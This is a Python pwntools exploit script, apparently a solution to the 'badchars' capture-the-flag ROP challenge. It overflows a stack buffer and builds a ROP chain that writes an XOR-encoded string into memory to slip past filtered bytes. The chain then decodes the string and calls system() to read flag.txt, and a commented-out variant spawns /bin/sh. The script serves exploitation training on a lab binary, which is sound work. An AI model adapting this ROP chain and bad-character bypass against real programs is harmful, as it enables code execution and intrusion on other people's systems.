from pwn import *

# extend arr to be divisible by n (extend using ch
def extend(arr, n, ch):
	diff = 8 - (len(arr) % 8)
	arr.extend([ch] * diff)
	return arr

# convert string to integer in little endian in groups of 4 bytes
def string2int(st):
	def change(ch): return hex(ord(ch))[2:]
	arr = list(map(change, list(st)))
	arr = extend(arr, 8, '00')

	res = []
	for i in range(0, len(arr), 8):
		res.append(arr[i:i+8])

	for i in range(len(res)):
		each = res[i]
		each.reverse()
		fin = ''.join(each)
		res[i] = int(fin, 16)
	
	return res

# takes string and bad characters as input and returns 3 values
# a good string with bad characters replaced, a list of positions of bad characters
# and the number used to XOR the bad characters
def get_good_string(string, badchars):
	bad = []
	pos = []
	final = list(string)

	for i in range(len(string)):
		if string[i] in badchars:
			bad.append(string[i])
			pos.append(i)

	res = None
	off = -1

	for i in range(128):
		temp = []

		for ch in bad:
			new = chr(ord(ch) ^ i)
			if new not in badchars:
				temp.append(new)
		
		if len(temp) == len(bad):
			res = temp
			off = i
			break
	
	for i in range(len(res)):
		final[pos[i]] = res[i]
	
	return ''.join(final), pos, off

e = ELF('./badchars')
p = e.process()

print(p.recv().decode())

# raw_input('attach gdb')

# solution 2 -> spawn shell
# st = '/bin/sh'

st = '/bin/cat flag.txt'
badchars = ['b','i','c','/', ' ', 'f', 'n', 's']

# get good string, positions of badchars and number to reverse xor
good, pos, xorn = get_good_string(st, badchars)

hexs = string2int(good)

# base
base = 0x601100

# address of system call instruction
system = 0x4009e8

# gadgets

# extra ret for aligning RSP
ret = p64(0x4006b1)

# mov qword ptr [r13], r12 ; ret
mov = p64(0x400b34)

# pop r12 ; pop r13 ; ret
pop = p64(0x0400b3b)

# xor byte ptr [r15], r14b ; ret
xorg = p64(0x400b30)

# pop r15 ; ret
r15 = p64(0x400b42)

# pop r14 ; pop r15 ; ret
r2 = p64(0x400b40)

# pop rdi ; ret
rdi = p64(0x400b39)

payload = b'A' * 40
payload += ret

mem = base
for n in hexs:
	payload += pop
	payload += p64(n)
	payload += p64(mem)
	payload += mov

	# increment mem to next address
	mem += 8

payload += r2
payload += p64(xorn)
payload += p64(0xdeadbeef)

for val in pos:
	payload += r15
	payload += p64(base+val)
	payload += xorg

payload += rdi
payload += p64(base)
payload += p64(system)

p.sendline(payload)

flag = p.recv().decode()
success(flag)

# solution 2
# p.interactive()